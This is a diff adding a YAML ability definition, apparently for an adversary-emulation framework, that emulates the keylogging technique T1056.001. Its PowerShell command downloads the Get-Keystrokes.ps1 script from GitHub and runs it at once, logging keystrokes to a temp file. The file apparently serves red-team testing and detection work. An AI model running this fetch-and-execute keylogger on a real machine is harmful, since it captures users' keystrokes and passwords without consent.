@@ -1,0 +1,31 @@
+---
+- id: a18a0e98b9566d92a1611a2da69b413b
+  name: Input Capture
+  description: 'Utilize PowerShell and external resource to capture keystrokes
+
+    [Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1)
+
+    Provided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)
+
+
+    Upon successful execution, Powershell will execute `Get-Keystrokes.ps1` and output
+    to key.log.
+
+    '
+  tactic: multiple
+  technique:
+    attack_id: T1056.001
+    name: 'Input Capture: Keylogging'
+  platforms:
+    windows:
+      psh:
+        command: if (Test-Path "PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1")
+          { ; } else {New-Item -ItemType Directory (Split-Path "PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1")
+          -Force | Out-Null; Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056.001/src/Get-Keystrokes.ps1
+          -OutFile "PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1"};  &"$PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1"
+          -LogPath $env:TEMP\key.log
+        payloads: []
+        cleanup: Remove-Item $env:TEMP\key.log -ErrorAction Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
